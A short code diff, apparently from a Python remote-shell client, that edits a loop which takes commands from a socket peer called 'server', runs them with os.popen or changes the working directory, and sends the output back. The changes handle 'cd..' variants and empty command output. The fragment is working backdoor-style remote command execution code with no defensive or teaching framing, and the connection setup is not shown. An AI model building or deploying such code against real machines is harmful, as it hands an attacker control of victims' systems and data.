@@ -25,11 +25,11 @@ while True:
     else:
         print(command)
 
-        if command == "cd ..":
+        if command == "cd .." or command == "cd..":
             curDir = cwd.decode("utf-8").split("\\")
             os.chdir("\\".join(curDir[:len(curDir)-1]))
             server.send(b"COMMAND EXCPETION.")
-        elif "cd" in command and command != "cd .." and len(command) > 2:
+        elif "cd" in command and (".." not in command) and len(command) > 2:
             newDir = command.split(" ")[1]
             newDir = cwd.decode("utf-8") + "\\" + newDir
             os.chdir(newDir)
@@ -40,4 +40,8 @@ while True:
             server.send(b"This command is currently not supported.\n")
         else:
             output = os.popen(command).read().encode("utf-8")
-            server.send(output)
+
+            if output.decode("utf-8") != "":
+                server.send(output)
+            else:
+                server.send(b"COMMAND EXCPETION.")
